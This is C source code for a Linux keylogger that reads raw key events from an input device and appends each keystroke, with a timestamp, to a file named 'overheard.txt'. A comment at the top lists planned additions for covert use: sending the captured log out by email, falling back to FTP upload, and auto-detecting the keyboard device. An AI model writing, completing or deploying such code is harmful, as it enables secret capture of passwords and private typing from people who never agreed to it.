/*
* ADD SLEEP
* ADD ERROR IF USER IS NOT ROOT
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices)
* ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
* IF STATEMENT--->SEND LOG FILE VIA EMAIL
* ELSE ERROR--->UPLOAD VIA FTP
* GRAB FROM IRC????
*/
#include <linux/input.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

#include "keymap.h"


int main(int argc, char **argv) {
	FILE *recording;
	int i = 0;
	int listening;
	int kbhit(void);				/* detects keyboard hit via time */
	struct input_event ev;			/* using input_event so we 
									 * know what we're reading 
									 */
	time_t curtime;
	time(&curtime);
	listening = open(argv[1], O_RDONLY|O_TRUNC|O_NONBLOCK);	/* opens the event file */

	if(argc < 2) {
		printf("USAGE: %s <device>\n", argv[0]);
		return 1;
	}

	recording = fopen("overheard.txt", "a+");  	/* opens/creates the log */
	setbuf(recording, NULL);					/* forces immediate write to recording */
	
	if (recording == NULL) {
		fprintf(stderr, "ERROR: Log file not found\n");
		return 1;
	}

	fprintf(recording, "\n\n%s", ctime(&curtime));	/* adds timestamp */
	while(1) {
		read(listening, &ev, sizeof(struct input_event));
		if(ev.value == 0 && ev.type == 1) {			/* only register release state */
			fprintf(recording, "%s", KeyMap[ev.code]);
		}
	}

	fclose(recording);

	return 0;
}